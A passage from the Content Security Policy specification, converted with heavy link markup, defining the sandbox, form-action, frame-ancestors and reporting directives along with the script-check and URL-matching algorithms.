            link-type="dfn"} is \"`enforce`\", return \"`Blocked`\".

    [Note:]{.marker} We compare against the fallback base URL in order
    to deal correctly with things like [an iframe `srcdoc`
    `Document`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#an-iframe-srcdoc-document){#ref-for-an-iframe-srcdoc-document
    link-type="dfn"} which has been sandboxed into an opaque origin.

2.  Return \"`Allowed`\".

#### [6.3.2. ]{.secno}[`sandbox`]{.content}[](#directive-sandbox){.self-link} {#directive-sandbox .heading .settled level="6.3.2"}

The [sandbox]{#sandbox .dfn .dfn-paneled dfn-type="dfn" export=""}
directive specifies an HTML sandbox policy which the user agent will
apply to a resource, just as though it had been included in an
[`iframe`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element){#ref-for-the-iframe-element①
link-type="element"} with a
[`sandbox`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox){#ref-for-attr-iframe-sandbox
link-type="element-sub"} property.

The directive's syntax is described by the following ABNF grammar, with
the additional requirement that each token value MUST be one of the
keywords defined by HTML specification as allowed values for the
[`iframe`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element){#ref-for-the-iframe-element②
link-type="element"}
[`sandbox`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox){#ref-for-attr-iframe-sandbox①
link-type="element-sub"} attribute
[\[HTML\]](#biblio-html "HTML Standard"){link-type="biblio"}.

    directive-name  = "sandbox"
    directive-value = "" / token *( required-ascii-whitespace token )

This directive has no reporting requirements; it will be ignored
entirely when delivered in a
[`Content-Security-Policy-Report-Only`](#header-content-security-policy-report-only){#ref-for-header-content-security-policy-report-only③
link-type="http-header"} header, or within a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta①⓪
link-type="element"} element.

##### [6.3.2.1. ]{.secno}[ `sandbox` Initialization ]{.content}[](#sandbox-init){.self-link} {#sandbox-init .algorithm .heading .settled algorithm="sandbox Initialization" level="6.3.2.1"}

This directive's
[initialization](#directive-initialization){#ref-for-directive-initialization③
link-type="dfn"} algorithm is responsible for checking whether a worker
is allowed to run according to the
[`sandbox`](#sandbox){#ref-for-sandbox① link-type="dfn"} values present
in its policies as follows:

[Note:]{.marker} The [sandbox](#sandbox){#ref-for-sandbox②
link-type="dfn"} directive is also responsible for adjusting a
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document①②
link-type="idl"}'s [active sandboxing flag
set](https://html.spec.whatwg.org/multipage/browsers.html#active-sandboxing-flag-set){#ref-for-active-sandboxing-flag-set
link-type="dfn"} via the [CSP-derived sandboxing
flags](https://html.spec.whatwg.org/multipage/browsers.html#csp-derived-sandboxing-flags){#ref-for-csp-derived-sandboxing-flags①
link-type="dfn"}.

Given a
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document①③
link-type="idl"} or [global
object](https://html.spec.whatwg.org/multipage/webappapis.html#global-object){#ref-for-global-object①④
link-type="dfn"} `context`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑥⑤
link-type="dfn"} `policy`{.variable}:

1.  If `policy`{.variable}'s
    [disposition](#policy-disposition){#ref-for-policy-disposition①⑧
    link-type="dfn"} is not \"`enforce`\", or `context`{.variable} is
    not a
    [`WorkerGlobalScope`{.idl}](https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope){#ref-for-workerglobalscope②
    link-type="idl"}, then abort this algorithm.

2.  Let `sandboxing flag set`{.variable} be a new [sandboxing flag
    set](https://html.spec.whatwg.org/multipage/browsers.html#sandboxing-flag-set){#ref-for-sandboxing-flag-set
    link-type="dfn"}.

3.  [Parse a sandboxing
    directive](https://html.spec.whatwg.org/multipage/browsers.html#parse-a-sandboxing-directive){#ref-for-parse-a-sandboxing-directive
    link-type="dfn"} using this directive's
    [value](#directive-value){#ref-for-directive-value⑤③
    link-type="dfn"} as the input, and `sandboxing flag set`{.variable}
    as the output.

4.  If `sandboxing flag set`{.variable} contains either the [sandboxed
    scripts browsing context
    flag](https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-scripts-browsing-context-flag){#ref-for-sandboxed-scripts-browsing-context-flag
    link-type="dfn"} or the [sandboxed origin browsing context
    flag](https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-origin-browsing-context-flag){#ref-for-sandboxed-origin-browsing-context-flag
    link-type="dfn"} flags, return \"`Blocked`\".

    [Note:]{.marker} This will need to change if we allow Workers to be
    sandboxed into unique origins, which seems like a pretty reasonable
    thing to do.

5.  Return \"`Allowed`\".

### [6.4. ]{.secno}[ Navigation Directives ]{.content}[](#directives-navigation){.self-link} {#directives-navigation .heading .settled level="6.4"}

#### [6.4.1. ]{.secno}[`form-action`]{.content}[](#directive-form-action){.self-link} {#directive-form-action .heading .settled level="6.4.1"}

The [form-action]{#form-action .dfn .dfn-paneled dfn-type="dfn"
export=""} directive restricts the
[`URL`{.idl}](https://url.spec.whatwg.org/#url){#ref-for-url⑦
link-type="idl"}s which can be used as the target of a form submissions
from a given context. The directive's syntax is described by the
following ABNF grammar:

``` abnf
directive-name  = "form-action"
directive-value = serialized-source-list
```

##### [6.4.1.1. ]{.secno}[ `form-action` Pre-Navigation Check ]{.content}[](#form-action-pre-navigate){.self-link} {#form-action-pre-navigate .algorithm .heading .settled algorithm="form-action Pre-Navigation Check" level="6.4.1.1"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑤②
link-type="dfn"} `request`{.variable}, a string
`navigation type`{.variable} (\"`form-submission`\" or \"`other`\"), and
a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑥⑥
link-type="dfn"} `policy`{.variable} this algorithm returns
\"`Blocked`\" if a form submission violates the `form-action`
directive's constraints, and \"`Allowed`\" otherwise. This constitutes
the `form-action` directive's [pre-navigation
check](#directive-pre-navigation-check){#ref-for-directive-pre-navigation-check①
link-type="dfn"}:

1.  Assert: `policy`{.variable} is unused in this algorithm.

2.  If `navigation type`{.variable} is \"`form-submission`\":

    1.  If the result of executing [§ 6.7.2.5 Does request match source
        list?](#match-request-to-source-list) on `request`{.variable},
        this directive's
        [value](#directive-value){#ref-for-directive-value⑤④
        link-type="dfn"}, and a `policy`{.variable}, is
        \"`Does Not Match`\", return \"`Blocked`\".

3.  Return \"`Allowed`\".

#### [6.4.2. ]{.secno}[`frame-ancestors`]{.content}[](#directive-frame-ancestors){.self-link} {#directive-frame-ancestors .heading .settled level="6.4.2"}

The [frame-ancestors]{#frame-ancestors .dfn .dfn-paneled dfn-type="dfn"
export=""} directive restricts the
[`URL`{.idl}](https://url.spec.whatwg.org/#url){#ref-for-url⑧
link-type="idl"}s which can embed the resource using
[`frame`](https://html.spec.whatwg.org/multipage/obsolete.html#frame){#ref-for-frame①
link-type="element"},
[`iframe`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element){#ref-for-the-iframe-element③
link-type="element"},
[`object`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element){#ref-for-the-object-element④
link-type="element"}, or
[`embed`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element){#ref-for-the-embed-element②
link-type="element"}. Resources can use this directive to avoid many UI
Redressing
[\[UISECURITY\]](#biblio-uisecurity "User Interface Security and the Visibility API"){link-type="biblio"}
attacks, by avoiding the risk of being embedded into potentially hostile
contexts.

The directive's syntax is described by the following ABNF grammar:

    directive-name  = "frame-ancestors"
    directive-value = ancestor-source-list

    ancestor-source-list = ( ancestor-source *( required-ascii-whitespace ancestor-source) ) / "'none'"
    ancestor-source      = scheme-source / host-source / "'self'"

The `frame-ancestors` directive MUST be ignored when contained in a
policy declared via a
[`meta`](https://html.spec.whatwg.org/multipage/semantics.html#meta){#ref-for-meta①①
link-type="element"} element.

[Note:]{.marker} The `frame-ancestors` directive's syntax is similar to
a [source list](#source-lists){#ref-for-source-lists①① link-type="dfn"},
but `frame-ancestors` will not fall back to the `default-src`
directive's value if one is specified. That is, a policy that declares
`default-src 'none'` will still allow the resource to be embedded by
anyone.

##### [6.4.2.1. ]{.secno}[ `frame-ancestors` Navigation Response Check ]{.content}[](#frame-ancestors-navigation-response){.self-link} {#frame-ancestors-navigation-response .algorithm .heading .settled algorithm="frame-ancestors Navigation Response Check" level="6.4.2.1"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑤③
link-type="dfn"} `request`{.variable}, a string
`navigation type`{.variable} (\"`form-submission`\" or \"`other`\"), a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response②⑥
link-type="dfn"} `navigation response`{.variable}, a
[navigable](https://html.spec.whatwg.org/#navigable){#ref-for-navigable③
link-type="dfn"} `target`{.variable}, a string `check type`{.variable}
(\"`source`\" or \"`response`\"), and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑥⑦
link-type="dfn"} `policy`{.variable} this algorithm returns
\"`Blocked`\" if one or more of the ancestors of `target`{.variable}
violate the `frame-ancestors` directive delivered with the response, and
\"`Allowed`\" otherwise. This constitutes the `frame-ancestors`
directive's [navigation response
check](#directive-navigation-response-check){#ref-for-directive-navigation-response-check②
link-type="dfn"}:

1.  If `navigation response`{.variable}'s
    [URL](https://fetch.spec.whatwg.org/#concept-response-url){#ref-for-concept-response-url②
    link-type="dfn"} [is
    local](https://fetch.spec.whatwg.org/#is-local){#ref-for-is-local
    link-type="dfn"}, return \"`Allowed`\".

2.  Assert: `request`{.variable}, `navigation response`{.variable}, and
    `navigation type`{.variable}, are unused from this point forward in
    this algorithm, as `frame-ancestors` is concerned only with
    `navigation response`{.variable}'s
    [frame-ancestors](#frame-ancestors){#ref-for-frame-ancestors②
    link-type="dfn"} [directive](#directives){#ref-for-directives②⑧
    link-type="dfn"}.

3.  If `check type`{.variable} is \"`source`\", return \"`Allowed`\".

    [Note:]{.marker} The \'frame-ancestors\'
    [directive](#directives){#ref-for-directives②⑨ link-type="dfn"} is
    relevant only to the `target`{.variable}
    [navigable](https://html.spec.whatwg.org/#navigable){#ref-for-navigable④
    link-type="dfn"} and it has no impact on the `request`{.variable}'s
    context.

4.  If `target`{.variable} is not a [child
    navigable](https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable){#ref-for-child-navigable③
    link-type="dfn"}, return \"`Allowed`\".

5.  Let `current`{.variable} be `target`{.variable}.

6.  While `current`{.variable} is a [child
    navigable](https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable){#ref-for-child-navigable④
    link-type="dfn"}:

    1.  Let `document`{.variable} be `current`{.variable}'s [container
        document](https://html.spec.whatwg.org/multipage/document-sequences.html#nav-container-document){#ref-for-nav-container-document
        link-type="dfn"}.

    2.  Let `origin`{.variable} be the result of executing the [URL
        parser](https://url.spec.whatwg.org/#concept-url-parser){#ref-for-concept-url-parser①
        link-type="dfn"} on the [ASCII
        serialization](https://html.spec.whatwg.org/multipage/browsers.html#ascii-serialisation-of-an-origin){#ref-for-ascii-serialisation-of-an-origin
        link-type="dfn"} of `document`{.variable}'s
        [origin](https://dom.spec.whatwg.org/#concept-document-origin){#ref-for-concept-document-origin
        link-type="dfn"}.

    3.  If [§ 6.7.2.7 Does url match source list in origin with redirect
        count?](#match-url-to-source-list) returns `Does Not Match` when
        executed upon `origin`{.variable}, this directive's
        [value](#directive-value){#ref-for-directive-value⑤⑤
        link-type="dfn"}, `policy`{.variable}'s
        [self-origin](#policy-self-origin){#ref-for-policy-self-origin②
        link-type="dfn"}, and `0`, return \"`Blocked`\".

    4.  Set `current`{.variable} to `document`{.variable}'s [node
        navigable](https://html.spec.whatwg.org/multipage/document-sequences.html#node-navigable){#ref-for-node-navigable
        link-type="dfn"}.

7.  Return \"`Allowed`\".

##### [6.4.2.2. ]{.secno}[ Relation to \``` ` ``[`X-Frame-Options`](https://html.spec.whatwg.org/multipage/speculative-loading.html#x-frame-options){#ref-for-x-frame-options link-type="http-header"}`` ` ``\` ]{.content}[](#frame-ancestors-and-frame-options){.self-link} {#frame-ancestors-and-frame-options .heading .settled level="6.4.2.2"}

This directive is similar to the
\``` ` ``[`X-Frame-Options`](https://html.spec.whatwg.org/multipage/speculative-loading.html#x-frame-options){#ref-for-x-frame-options①
link-type="http-header"}`` ` ``\` HTTP response header. The `'none'`
source expression is roughly equivalent to that header's \``DENY`\`, and
`'self'` to that header's \``SAMEORIGIN`\`.
[\[HTML\]](#biblio-html "HTML Standard"){link-type="biblio"}

In order to allow backwards-compatible deployment, the
[`frame-ancestors`](#frame-ancestors){#ref-for-frame-ancestors③
link-type="dfn"} directive *overrides* the
\``` ` ``[`X-Frame-Options`](https://html.spec.whatwg.org/multipage/speculative-loading.html#x-frame-options){#ref-for-x-frame-options②
link-type="http-header"}`` ` ``\` header. If a resource is delivered
with a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑥⑧
link-type="dfn"} that includes a
[directive](#directives){#ref-for-directives③⓪ link-type="dfn"} named
[`frame-ancestors`](#frame-ancestors){#ref-for-frame-ancestors④
link-type="dfn"} and whose
[disposition](#policy-disposition){#ref-for-policy-disposition①⑨
link-type="dfn"} is \"`enforce`\", then the
\``` ` ``[`X-Frame-Options`](https://html.spec.whatwg.org/multipage/speculative-loading.html#x-frame-options){#ref-for-x-frame-options③
link-type="http-header"}`` ` ``\` header will be ignored, per HTML's
processing model.

### [6.5. ]{.secno}[ Reporting Directives ]{.content}[](#directives-reporting){.self-link} {#directives-reporting .heading .settled level="6.5"}

Various algorithms in this document hook into the reporting process by
constructing a [violation](#violation){#ref-for-violation②③
link-type="dfn"} object via [§ 2.4.2 Create a violation object for
request, and policy.](#create-violation-for-request) or [§ 2.4.1 Create
a violation object for global, policy, and
directive](#create-violation-for-global), and passing that object to
[§ 5.5 Report a violation](#report-violation) to deliver the report.

#### [6.5.1. ]{.secno}[`report-uri`]{.content}[](#directive-report-uri){.self-link} {#directive-report-uri .heading .settled level="6.5.1"}

:::: {.note role="note"}
Note: The [`report-uri`](#report-uri){#ref-for-report-uri②
link-type="dfn"} directive is deprecated. Please use the
[`report-to`](#report-to){#ref-for-report-to③ link-type="dfn"} directive
instead. If the latter directive is present, this directive will be
ignored. To ensure backwards compatibility, we suggest specifying both,
like this:

::: {#example-0ac8d9c4 .example}
[](#example-0ac8d9c4){.self-link}

    Content-Security-Policy: ...; report-uri https://endpoint.com; report-to groupname
:::
::::

The [`report-uri`]{#report-uri .dfn .dfn-paneled dfn-type="dfn"
export=""} directive defines a set of endpoints to which [csp violation
reports](#csp-violation-report){#ref-for-csp-violation-report②
link-type="dfn"} will be sent when particular behaviors are prevented.

    directive-name  = "report-uri"
    directive-value = uri-reference *( required-ascii-whitespace uri-reference )

    ; The uri-reference grammar is defined in Section 4.1 of RFC 3986.

The directive has no effect in and of itself, but only gains meaning in
combination with other directives.

#### [6.5.2. ]{.secno}[`report-to`]{.content}[](#directive-report-to){.self-link} {#directive-report-to .heading .settled level="6.5.2"}

The [`report-to`]{#report-to .dfn .dfn-paneled dfn-type="dfn" export=""}
directive defines a [reporting
endpoint](https://www.w3.org/TR/reporting-1/#endpoint){#ref-for-endpoint
link-type="dfn"} to which violation reports ought to be sent
[\[REPORTING\]](#biblio-reporting "Reporting API"){link-type="biblio"}.
The directive's behavior is defined in [§ 5.5 Report a
violation](#report-violation). The directive's name and value are
described by the following ABNF:

    directive-name  = "report-to"
    directive-value = token

### [6.6. ]{.secno}[ Directives Defined in Other Documents ]{.content}[](#directives-elsewhere){.self-link} {#directives-elsewhere .heading .settled level="6.6"}

This document defines a core set of directives, and sets up a framework
for modular extension by other specifications. At the time this document
was produced, the following stable documents extend CSP:

- [\[MIX\]](#biblio-mix "Mixed Content"){link-type="biblio"} defines
  `block-all-mixed-content`

- [\[UPGRADE-INSECURE-REQUESTS\]](#biblio-upgrade-insecure-requests "Upgrade Insecure Requests"){link-type="biblio"}
  defines `upgrade-insecure-requests`

Extensions to CSP MUST register themselves via the process outlined in
[\[RFC7762\]](#biblio-rfc7762 "Initial Assignment for the Content Security Policy Directives Registry"){link-type="biblio"}.
In particular, note the criteria discussed in Section 4.2 of that
document.

New directives SHOULD use the [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check①⑦
link-type="dfn"}, [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check①⑧
link-type="dfn"}, and
[initialization](#directive-initialization){#ref-for-directive-initialization④
link-type="dfn"} hooks in order to integrate themselves into Fetch and
HTML.

### [6.7. ]{.secno}[Matching Algorithms]{.content}[](#matching-algorithms){.self-link} {#matching-algorithms .heading .settled level="6.7"}

#### [6.7.1. ]{.secno}[Script directive checks]{.content}[](#script-checks){.self-link} {#script-checks .heading .settled level="6.7.1"}

##### [6.7.1.1. ]{.secno}[ Script directives pre-request check ]{.content}[](#script-pre-request){.self-link} {#script-pre-request .algorithm .heading .settled algorithm="Script directives pre-request check" level="6.7.1.1"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑤④
link-type="dfn"} `request`{.variable}, a
[directive](#directives){#ref-for-directives③① link-type="dfn"}
`directive`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑥⑨
link-type="dfn"} `policy`{.variable}:

1.  If `request`{.variable}'s
    [destination](https://fetch.spec.whatwg.org/#concept-request-destination){#ref-for-concept-request-destination⑦
    link-type="dfn"} is
    [script-like](https://fetch.spec.whatwg.org/#request-destination-script-like){#ref-for-request-destination-script-like③
    link-type="dfn"}:

    1.  If the result of executing [§ 6.7.2.3 Does nonce match source
        list?](#match-nonce-to-source-list) on `request`{.variable}'s
        [cryptographic nonce
        metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata){#ref-for-concept-request-nonce-metadata⑤
        link-type="dfn"} and this directive's
        [value](#directive-value){#ref-for-directive-value⑤⑥
        link-type="dfn"} is \"`Matches`\", return \"`Allowed`\".

    2.  If the result of executing [§ 6.7.2.4 Does integrity metadata
        match source list?](#match-integrity-metadata-to-source-list) on
        `request`{.variable}'s [integrity
        metadata](https://fetch.spec.whatwg.org/#concept-request-integrity-metadata){#ref-for-concept-request-integrity-metadata
        link-type="dfn"} and this directive's
        [value](#directive-value){#ref-for-directive-value⑤⑦
        link-type="dfn"} is \"`Matches`\", return \"`Allowed`\".

    3.  If `directive`{.variable}'s
        [value](#directive-value){#ref-for-directive-value⑤⑧
        link-type="dfn"} contains a [source
        expression](#source-expression){#ref-for-source-expression⑥
        link-type="dfn"} that is an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive⑥
        link-type="dfn"} match for the
        \"[`'strict-dynamic'`](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic
        link-type="grammar"}\"
        [keyword-source](#grammardef-keyword-source){#ref-for-grammardef-keyword-source①
        link-type="grammar"}:

        1.  If the `request`{.variable}'s [parser
            metadata](https://fetch.spec.whatwg.org/#concept-request-parser-metadata){#ref-for-concept-request-parser-metadata①
            link-type="dfn"} is
            [\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted){#ref-for-parser-inserted①
            link-type="dfn"}, return \"`Blocked`\".

            Otherwise, return \"`Allowed`\".

            [Note:]{.marker}
            \"[`'strict-dynamic'`](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic①
            link-type="grammar"}\" is explained in more detail in [§ 8.2
            Usage of \"\'strict-dynamic\'\"](#strict-dynamic-usage).

    4.  If the result of executing [§ 6.7.2.5 Does request match source
        list?](#match-request-to-source-list) on `request`{.variable},
        `directive`{.variable}'s
        [value](#directive-value){#ref-for-directive-value⑤⑨
        link-type="dfn"}, and `policy`{.variable}, is
        \"`Does Not Match`\", return \"`Blocked`\".

2.  Return \"`Allowed`\".

##### [6.7.1.2. ]{.secno}[ Script directives post-request check ]{.content}[](#script-post-request){.self-link} {#script-post-request .algorithm .heading .settled algorithm="Script directives post-request check" level="6.7.1.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check①⑨
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑤⑤
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response②⑦
link-type="dfn"} `response`{.variable}, a
[directive](#directives){#ref-for-directives③② link-type="dfn"}
`directive`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑦⓪
link-type="dfn"} `policy`{.variable}:

[Note:]{.marker} This check needs both `request`{.variable} and
`response`{.variable} as input parameters since if
`request`{.variable}'s [cryptographic nonce
metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata){#ref-for-concept-request-nonce-metadata⑥
link-type="dfn"} or [integrity
metadata](https://fetch.spec.whatwg.org/#concept-request-integrity-metadata){#ref-for-concept-request-integrity-metadata①
link-type="dfn"} matches, then the script is allowed to load and the
check of whether `response`{.variable}'s url matches the source list is
skipped.

1.  If `request`{.variable}'s
    [destination](https://fetch.spec.whatwg.org/#concept-request-destination){#ref-for-concept-request-destination⑧
    link-type="dfn"} is
    [script-like](https://fetch.spec.whatwg.org/#request-destination-script-like){#ref-for-request-destination-script-like④
    link-type="dfn"}:

    1.  Call [potentially report
        hash](#potentially-report-hash){#ref-for-potentially-report-hash①
        link-type="dfn"} with `response`{.variable},
        `request`{.variable}, `directive`{.variable} and
        `policy`{.variable}.

    2.  If the result of executing [§ 6.7.2.3 Does nonce match source
        list?](#match-nonce-to-source-list) on `request`{.variable}'s
        [cryptographic nonce
        metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata){#ref-for-concept-request-nonce-metadata⑦
        link-type="dfn"} and this directive's
        [value](#directive-value){#ref-for-directive-value⑥⓪
        link-type="dfn"} is \"`Matches`\", return \"`Allowed`\".

    3.  If the result of executing [§ 6.7.2.4 Does integrity metadata
        match source list?](#match-integrity-metadata-to-source-list) on
        `request`{.variable}'s [integrity
        metadata](https://fetch.spec.whatwg.org/#concept-request-integrity-metadata){#ref-for-concept-request-integrity-metadata②
        link-type="dfn"} and this directive's
        [value](#directive-value){#ref-for-directive-value⑥①
        link-type="dfn"} is \"`Matches`\", return \"`Allowed`\".

    4.  If `directive`{.variable}'s
        [value](#directive-value){#ref-for-directive-value⑥②
        link-type="dfn"} contains a [source
        expression](#source-expression){#ref-for-source-expression⑦
        link-type="dfn"} that is an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive⑦
        link-type="dfn"} match for the
        \"[`'strict-dynamic'`](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic②
        link-type="grammar"}\"
        [keyword-source](#grammardef-keyword-source){#ref-for-grammardef-keyword-source②
        link-type="grammar"}:

        1.  If the `request`{.variable}'s [parser
            metadata](https://fetch.spec.whatwg.org/#concept-request-parser-metadata){#ref-for-concept-request-parser-metadata②
            link-type="dfn"} is
            [\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted){#ref-for-parser-inserted②
            link-type="dfn"}, return \"`Blocked`\".

            Otherwise, return \"`Allowed`\".

            [Note:]{.marker}
            \"[`'strict-dynamic'`](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic③
            link-type="grammar"}\" is explained in more detail in [§ 8.2
            Usage of \"\'strict-dynamic\'\"](#strict-dynamic-usage).

    5.  If the result of executing [§ 6.7.2.6 Does response to request
        match source list?](#match-response-to-source-list) on
        `response`{.variable}, `request`{.variable},
        `directive`{.variable}'s
        [value](#directive-value){#ref-for-directive-value⑥③
        link-type="dfn"}, and `policy`{.variable}, is
        \"`Does Not Match`\", return \"`Blocked`\".

2.  Return \"`Allowed`\".

#### [6.7.2. ]{.secno}[URL Matching]{.content}[](#matching-urls){.self-link} {#matching-urls .heading .settled level="6.7.2"}

##### [6.7.2.1. ]{.secno}[ Does `request`{.variable} violate `policy`{.variable}? ]{.content}[](#does-request-violate-policy){.self-link} {#does-request-violate-policy .algorithm .heading .settled algorithm="Does request violate policy?" level="6.7.2.1"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑤⑥
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑦①
link-type="dfn"} `policy`{.variable}, this algorithm returns the
violated [directive](#directives){#ref-for-directives③③ link-type="dfn"}
if the request violates the policy, and \"`Does Not Violate`\"
otherwise.

1.  If `request`{.variable}'s
    [initiator](https://fetch.spec.whatwg.org/#concept-request-initiator){#ref-for-concept-request-initiator①
    link-type="dfn"} is \"`prefetch`\", then return the result of
    executing [§ 6.7.2.2 Does resource hint request violate
    policy?](#does-resource-hint-violate-policy) on `request`{.variable}
    and `policy`{.variable}.

2.  Let `violates`{.variable} be \"`Does Not Violate`\".

3.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate②⑨
    link-type="dfn"} `directive`{.variable} of `policy`{.variable}:

    1.  Let `result`{.variable} be the result of executing
        `directive`{.variable}'s [pre-request
        check](#directive-pre-request-check){#ref-for-directive-pre-request-check①⑧
        link-type="dfn"} on `request`{.variable} and
        `policy`{.variable}.

    2.  If `result`{.variable} is \"`Blocked`\", then let
        `violates`{.variable} be `directive`{.variable}.

4.  Return `violates`{.variable}.

##### [6.7.2.2. ]{.secno}[ Does resource hint `request`{.variable} violate `policy`{.variable}? ]{.content}[](#does-resource-hint-violate-policy){.self-link} {#does-resource-hint-violate-policy .heading .settled level="6.7.2.2"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑤⑦
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑦②
link-type="dfn"} `policy`{.variable}, this algorithm returns the default
[directive](#directives){#ref-for-directives③④ link-type="dfn"} if the
resource-hint request violates all the policies, and
\"`Does Not Violate`\" otherwise.

1.  Let `defaultDirective`{.variable} be `policy`{.variable}'s first
    [directive](#directives){#ref-for-directives③⑤ link-type="dfn"}
    whose [name](#directive-name){#ref-for-directive-name①⑦
    link-type="dfn"} is \"`default-src`\".

2.  If `defaultDirective`{.variable} does not exist, return
    \"`Does Not Violate`\".

3.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate③⓪
    link-type="dfn"} `directive`{.variable} of `policy`{.variable}:

    1.  If `directive`{.variable}'s
        [name](#directive-name){#ref-for-directive-name①⑧
        link-type="dfn"} is not one of the following:

        - `child-src`

        - `connect-src`

        - `font-src`

        - `frame-src`

        - `img-src`

        - `manifest-src`

        - `media-src`

        - `object-src`

        - `script-src`

        - `script-src-elem`

        - `style-src`

        - `style-src-elem`

        - `worker-src`

        then continue.

    2.  Assert: `directive`{.variable}'s
        [value](#directive-value){#ref-for-directive-value⑥④
        link-type="dfn"} is a [source
        list](#source-lists){#ref-for-source-lists①② link-type="dfn"}.

    3.  Let `result`{.variable} be the result of executing [§ 6.7.2.5
        Does request match source list?](#match-request-to-source-list)
        on `request`{.variable}, `directive`{.variable}'s
        [value](#directive-value){#ref-for-directive-value⑥⑤
        link-type="dfn"}, and `policy`{.variable}.

    4.  If `result`{.variable} is \"`Allowed`\", then return
        \"`Does Not Violate`\".

4.  Return `defaultDirective`{.variable}.

##### [6.7.2.3. ]{.secno}[ Does `nonce`{.variable} match `source list`{.variable}? ]{.content}[](#match-nonce-to-source-list){.self-link} {#match-nonce-to-source-list .algorithm .heading .settled algorithm="Does nonce match source list?" level="6.7.2.3"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑤⑧
link-type="dfn"}'s [cryptographic nonce
metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata){#ref-for-concept-request-nonce-metadata⑧
link-type="dfn"} `nonce`{.variable} and a [source
list](#source-lists){#ref-for-source-lists①③ link-type="dfn"}
`source list`{.variable}, this algorithm returns \"`Matches`\" if the
nonce matches one or more source expressions in the list, and
\"`Does Not Match`\" otherwise:

1.  Assert: `source list`{.variable} is not null.

2.  If `nonce`{.variable} is the empty string, return
    \"`Does Not Match`\".

3.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate③①
    link-type="dfn"} `expression`{.variable} of
    `source list`{.variable}:

    1.  If `expression`{.variable} matches the
        [`nonce-source`](#grammardef-nonce-source){#ref-for-grammardef-nonce-source④
        link-type="grammar"} grammar, and `nonce`{.variable} is
        [identical
        to](https://infra.spec.whatwg.org/#string-is){#ref-for-string-is
        link-type="dfn"} `expression`{.variable}'s
        [`base64-value`](#grammardef-base64-value){#ref-for-grammardef-base64-value④
        link-type="grammar"} part, return \"`Matches`\".

4.  Return \"`Does Not Match`\".

##### [6.7.2.4. ]{.secno}[ Does `integrity metadata`{.variable} match `source list`{.variable}? ]{.content}[](#match-integrity-metadata-to-source-list){.self-link} {#match-integrity-metadata-to-source-list .algorithm .heading .settled algorithm="Does integrity metadata match source list?" level="6.7.2.4"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑤⑨
link-type="dfn"}'s [integrity
metadata](https://fetch.spec.whatwg.org/#concept-request-integrity-metadata){#ref-for-concept-request-integrity-metadata③
link-type="dfn"} `integrity metadata`{.variable} and a [source
list](#source-lists){#ref-for-source-lists①④ link-type="dfn"}
`source list`{.variable}, this algorithm returns \"`Matches`\" if the
integrity metadata matches one or more source expressions in the list,
and \"`Does Not Match`\" otherwise:

1.  Assert: `source list`{.variable} is not null.

2.  Let `integrity expressions`{.variable} be the set of [source
    expressions](#source-expression){#ref-for-source-expression⑧
    link-type="dfn"} in `source list`{.variable} that match the
    [hash-source](#grammardef-hash-source){#ref-for-grammardef-hash-source④
    link-type="grammar"} grammar.

